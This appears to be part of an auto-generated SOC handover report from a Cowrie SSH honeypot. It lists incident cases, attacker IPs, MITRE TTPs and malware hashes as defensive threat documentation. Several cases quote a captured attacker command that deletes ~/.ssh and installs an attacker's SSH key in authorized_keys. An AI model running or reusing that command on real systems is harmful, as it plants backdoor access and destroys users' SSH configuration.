| `2026-04-29 12:37:00` | `cowrie.command.failed` |
| `2026-04-29 12:37:00` | `cowrie.log.closed` |
| `2026-04-29 12:37:00` | `cowrie.session.params` |
| `2026-04-29 12:37:00` | `cowrie.command.input` |
| `2026-04-29 12:37:00` | `cowrie.session.file_download` |
| `2026-04-29 12:37:00` | `cowrie.log.closed` |
| `2026-04-29 12:37:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.232.74[.]249` to AbuseIPDB if not already reported
- [ ] Block `165.232.74[.]249` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7401f4f7dcae

| Field | Detail |
|---|---|
| **Source IP** | `165.232.74[.]249` |
| **First Seen** | 2026-04-29 12:37 |
| **Last Seen** | 2026-04-29 12:37 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-29 12:37:02` | `cowrie.session.connect` |
| `2026-04-29 12:37:02` | `cowrie.client.version` |
| `2026-04-29 12:37:03` | `cowrie.client.kex` |
| `2026-04-29 12:37:03` | `cowrie.login.success` |
| `2026-04-29 12:37:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.232.74[.]249` to AbuseIPDB if not already reported
- [ ] Block `165.232.74[.]249` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1cd1622c3b9b

| Field | Detail |
|---|---|
| **Source IP** | `165.232.74[.]249` |
| **First Seen** | 2026-04-29 12:37 |
| **Last Seen** | 2026-04-29 12:37 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-29 12:37:48` | `cowrie.session.connect` |
| `2026-04-29 12:37:48` | `cowrie.client.version` |
| `2026-04-29 12:37:48` | `cowrie.client.kex` |
| `2026-04-29 12:37:48` | `cowrie.login.success` |
| `2026-04-29 12:37:48` | `cowrie.session.params` |
| `2026-04-29 12:37:48` | `cowrie.command.input` |
| `2026-04-29 12:37:48` | `cowrie.command.failed` |
| `2026-04-29 12:37:49` | `cowrie.log.closed` |
| `2026-04-29 12:37:49` | `cowrie.session.params` |
| `2026-04-29 12:37:49` | `cowrie.command.input` |
| `2026-04-29 12:37:49` | `cowrie.session.file_download` |
| `2026-04-29 12:37:49` | `cowrie.log.closed` |
| `2026-04-29 12:37:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.232.74[.]249` to AbuseIPDB if not already reported
- [ ] Block `165.232.74[.]249` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fbb03c591645

| Field | Detail |
|---|---|
| **Source IP** | `165.232.74[.]249` |
| **First Seen** | 2026-04-29 12:37 |
| **Last Seen** | 2026-04-29 12:37 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-29 12:37:51` | `cowrie.session.connect` |
| `2026-04-29 12:37:51` | `cowrie.client.version` |
| `2026-04-29 12:37:51` | `cowrie.client.kex` |
| `2026-04-29 12:37:52` | `cowrie.login.success` |
| `2026-04-29 12:37:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.232.74[.]249` to AbuseIPDB if not already reported
- [ ] Block `165.232.74[.]249` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bd963a8307b2

| Field | Detail |
|---|---|
| **Source IP** | `165.232.74[.]249` |
| **First Seen** | 2026-04-29 12:52 |
| **Last Seen** | 2026-04-29 12:52 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-29 12:52:46` | `cowrie.session.connect` |
| `2026-04-29 12:52:46` | `cowrie.client.version` |
| `2026-04-29 12:52:46` | `cowrie.client.kex` |
| `2026-04-29 12:52:47` | `cowrie.login.success` |
| `2026-04-29 12:52:47` | `cowrie.session.params` |
| `2026-04-29 12:52:47` | `cowrie.command.input` |
| `2026-04-29 12:52:47` | `cowrie.command.failed` |
| `2026-04-29 12:52:47` | `cowrie.log.closed` |
| `2026-04-29 12:52:47` | `cowrie.session.params` |
| `2026-04-29 12:52:47` | `cowrie.command.input` |
| `2026-04-29 12:52:47` | `cowrie.session.file_download` |
| `2026-04-29 12:52:47` | `cowrie.log.closed` |
| `2026-04-29 12:52:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.232.74[.]249` to AbuseIPDB if not already reported
- [ ] Block `165.232.74[.]249` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-42a22b591e7c

| Field | Detail |
|---|---|
| **Source IP** | `165.232.74[.]249` |
| **First Seen** | 2026-04-29 12:52 |
| **Last Seen** | 2026-04-29 12:52 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-29 12:52:49` | `cowrie.session.connect` |
| `2026-04-29 12:52:49` | `cowrie.client.version` |
| `2026-04-29 12:52:50` | `cowrie.client.kex` |
| `2026-04-29 12:52:50` | `cowrie.login.success` |
| `2026-04-29 12:52:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.232.74[.]249` to AbuseIPDB if not already reported
- [ ] Block `165.232.74[.]249` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-13adac5e040d

| Field | Detail |
|---|---|
| **Source IP** | `165.232.74[.]249` |
| **First Seen** | 2026-04-29 12:53 |
| **Last Seen** | 2026-04-29 12:53 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-29 12:53:35` | `cowrie.session.connect` |
| `2026-04-29 12:53:35` | `cowrie.client.version` |
| `2026-04-29 12:53:35` | `cowrie.client.kex` |
| `2026-04-29 12:53:36` | `cowrie.login.success` |
| `2026-04-29 12:53:36` | `cowrie.session.params` |
| `2026-04-29 12:53:36` | `cowrie.command.input` |
| `2026-04-29 12:53:36` | `cowrie.command.failed` |
| `2026-04-29 12:53:36` | `cowrie.log.closed` |
| `2026-04-29 12:53:36` | `cowrie.session.params` |
| `2026-04-29 12:53:36` | `cowrie.command.input` |
| `2026-04-29 12:53:37` | `cowrie.session.file_download` |
| `2026-04-29 12:53:37` | `cowrie.log.closed` |
| `2026-04-29 12:53:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.232.74[.]249` to AbuseIPDB if not already reported
- [ ] Block `165.232.74[.]249` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5f4c82d0bd68

| Field | Detail |
|---|---|
| **Source IP** | `165.232.74[.]249` |
| **First Seen** | 2026-04-29 12:53 |
| **Last Seen** | 2026-04-29 12:53 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-29 12:53:39` | `cowrie.session.connect` |
| `2026-04-29 12:53:39` | `cowrie.client.version` |
| `2026-04-29 12:53:39` | `cowrie.client.kex` |
| `2026-04-29 12:53:39` | `cowrie.login.success` |
| `2026-04-29 12:53:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.232.74[.]249` to AbuseIPDB if not already reported
- [ ] Block `165.232.74[.]249` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d5f719c97e23

| Field | Detail |
|---|---|
| **Source IP** | `42.96.20[.]16` |
| **First Seen** | 2026-04-29 14:02 |
| **Last Seen** | 2026-04-29 14:02 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-29 14:02:35` | `cowrie.session.connect` |
| `2026-04-29 14:02:35` | `cowrie.client.version` |
| `2026-04-29 14:02:35` | `cowrie.client.kex` |
| `2026-04-29 14:02:35` | `cowrie.login.success` |
| `2026-04-29 14:02:36` | `cowrie.session.params` |
| `2026-04-29 14:02:36` | `cowrie.command.input` |
| `2026-04-29 14:02:36` | `cowrie.command.failed` |
| `2026-04-29 14:02:36` | `cowrie.log.closed` |
| `2026-04-29 14:02:36` | `cowrie.session.params` |
| `2026-04-29 14:02:36` | `cowrie.command.input` |
| `2026-04-29 14:02:36` | `cowrie.session.file_download` |
| `2026-04-29 14:02:36` | `cowrie.log.closed` |
| `2026-04-29 14:02:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `42.96.20[.]16` to AbuseIPDB if not already reported
- [ ] Block `42.96.20[.]16` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-579419507183

| Field | Detail |
|---|---|
| **Source IP** | `42.96.20[.]16` |
| **First Seen** | 2026-04-29 14:02 |
| **Last Seen** | 2026-04-29 14:02 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-29 14:02:40` | `cowrie.session.connect` |
| `2026-04-29 14:02:40` | `cowrie.client.version` |
| `2026-04-29 14:02:40` | `cowrie.client.kex` |
| `2026-04-29 14:02:40` | `cowrie.login.success` |
| `2026-04-29 14:02:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `42.96.20[.]16` to AbuseIPDB if not already reported
- [ ] Block `42.96.20[.]16` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `103.52.152[.]101` | **30** | 2026-04-29 10:18 | 2026-04-29 11:49 | 0m | 30 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `118.71.20[.]172` | **30** | 2026-04-29 10:13 | 2026-04-29 10:54 | 0m | 30 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `165.232.74[.]249` | **30** | 2026-04-29 11:51 | 2026-04-29 12:55 | 0m | 30 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `171.25.158[.]47` | **30** | 2026-04-29 11:49 | 2026-04-29 12:33 | 0m | 30 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `43.160.233[.]150` | **30** | 2026-04-29 11:39 | 2026-04-29 12:22 | 0m | 30 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `69.6.221[.]248` | **30** | 2026-04-29 11:57 | 2026-04-29 12:35 | 1m | 30 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `180.76.96[.]235` | **28** | 2026-04-29 11:39 | 2026-04-29 12:10 | 38m | 4 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `197.248.21[.]105` | **10** | 2026-04-29 11:18 | 2026-04-29 11:28 | 20m | 0 | `T1592` | 🟠 MEDIUM |
| `176.122.106[.]238` | **8** | 2026-04-29 13:26 | 2026-04-29 13:38 | 16m | 0 | `T1592` | 🟢 LOW |
| `72.203.207[.]182` | **4** | 2026-04-29 11:05 | 2026-04-29 11:13 | 8m | 0 | `T1592` | 🟢 LOW |
| `45.129.56[.]131` | **2** | 2026-04-29 12:04 | 2026-04-29 12:14 | 0m | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `47.251.64[.]120` | **2** | 2026-04-29 13:32 | 2026-04-29 13:32 | 0m | 0 | `T1592` | 🟢 LOW |
| `105.186.184[.]63` | 1 | 2026-04-29 13:01 | 2026-04-29 13:01 | 12s | 0 | `T1592` | 🟢 LOW |
| `118.145.239[.]117` | 1 | 2026-04-29 10:47 | 2026-04-29 10:49 | 120s | 0 | `T1592` | 🟢 LOW |
| `131.222.250[.]109` | 1 | 2026-04-29 11:08 | 2026-04-29 11:08 | 13s | 0 | `T1592` | 🟢 LOW |
| `154.221.28[.]214` | 1 | 2026-04-29 13:58 | 2026-04-29 13:58 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `185.128.94[.]66` | 1 | 2026-04-29 10:38 | 2026-04-29 10:38 | 12s | 0 | `T1592` | 🟢 LOW |
| `190.52.80[.]74` | 1 | 2026-04-29 12:04 | 2026-04-29 12:06 | 120s | 0 | `T1592` | 🟢 LOW |
| `42.96.20[.]16` | 1 | 2026-04-29 14:02 | 2026-04-29 14:02 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `44.202.229[.]210` | 1 | 2026-04-29 12:57 | 2026-04-29 12:57 | 1s | 0 | `T1592` | 🟢 LOW |
| `47.79.224[.]253` | 1 | 2026-04-29 12:10 | 2026-04-29 12:10 | 30s | 0 | `T1592` | 🟢 LOW |
| `49.88.156[.]34` | 1 | 2026-04-29 10:09 | 2026-04-29 10:09 | 120s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (24 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `20260429-011658-3f1992b60e9d-0-redir__root_a6s87d6as8zdgtdyas_ini` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |
| `8daf92f0870c58ece8b68a3057c3ab6e8477215f853c54cdfe790acf1141161d` | ELF Binary (Linux executable) (ARM 32-bit) | `8daf92f0870c58ec...` | 42/100 | 🟡 MEDIUM | **32/75** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 34/100 | 🟢 LOW | **11/75** 🔴 |
| `9a45029b646e2d20015695b5541f5fb76eace740bf329dc05af8ea53bd89619c` | Unknown binary | `9a45029b646e2d20...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **50/76** 🔴 |
| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 12/100 | 🟢 LOW | **30/75** 🔴 |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **50/76** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **50/76** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **50/76** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **50/76** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `103.52.152[.]101` | HK | VAPELINE TECHNOLOGY(HK).,LIMITED | **100** ⚠️ | 20 |
| `47.251.64[.]120` | US | Alibaba Cloud - US | **100** ⚠️ | 10 |
| `44.202.229[.]210` | US | Amazon Data Services Northern Virginia | **100** ⚠️ | 50 |
| `69.6.221[.]248` | BR | Newfold Digital, Inc. | **100** ⚠️ | 21 |
| `154.221.28[.]214` | HK | Yisu Cloud Ltd | **100** ⚠️ | 50 |
| `47.79.224[.]253` | SG | Alibaba Cloud LLC | **100** ⚠️ | 22 |
| `72.203.207[.]182` | US | Cox Communications Inc. | **100** ⚠️ | 2 |
| `42.96.20[.]16` | VN | Long Van System Solution JSC | **100** ⚠️ | 50 |
| `43.160.233[.]150` | SG | ACEVILLE PTE.LTD. | **100** ⚠️ | 16 |
| `165.232.74[.]249` | DE | DigitalOcean, LLC | **100** ⚠️ | 19 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 253 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 188 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 38 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 19 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 19 |

---

## 🔕 False Positive Summary (25 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 12 below threshold 25 | 1 |
| AbuseIPDB score 21 below threshold 25 | 1 |
| AbuseIPDB score 3 below threshold 25 | 1 |
| AbuseIPDB score 5 below threshold 25 | 5 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 17 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 307 cases |
| Tool 34  | Credential Extractor        | ✅ 226 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 6 fingerprints |
| Tool 36  | Command Clustering          | ✅ 1 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 31 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 25 filtered (8.1%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 28 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 24 files |
| Tool 33  | YARA Classifier             | ✅ 8 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 38 priority case(s) shown individually · 22 recon entry/entries in table (12 group(s) consolidating 234 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-04-29T14:07:32Z_
